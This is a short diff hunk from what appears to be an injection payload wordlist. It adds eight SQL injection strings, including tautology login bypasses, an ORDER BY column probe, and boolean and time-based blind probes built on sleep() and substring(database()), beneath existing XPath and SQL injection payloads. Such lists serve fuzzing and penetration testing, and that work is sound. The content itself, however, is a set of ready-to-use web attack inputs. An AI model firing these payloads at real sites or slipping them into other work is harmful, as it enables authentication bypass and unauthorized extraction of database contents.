@@ -186,3 +186,11 @@ admin' and substring(password/text(),1,1)='7
 ' and substring(password/text(),1,1)='7
 ' or 1=1 limit 1 -- -+
 '="or'
+' and 'x'='x
+admin' or 1=1;-- 
+?id=1' order by 1 --+
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
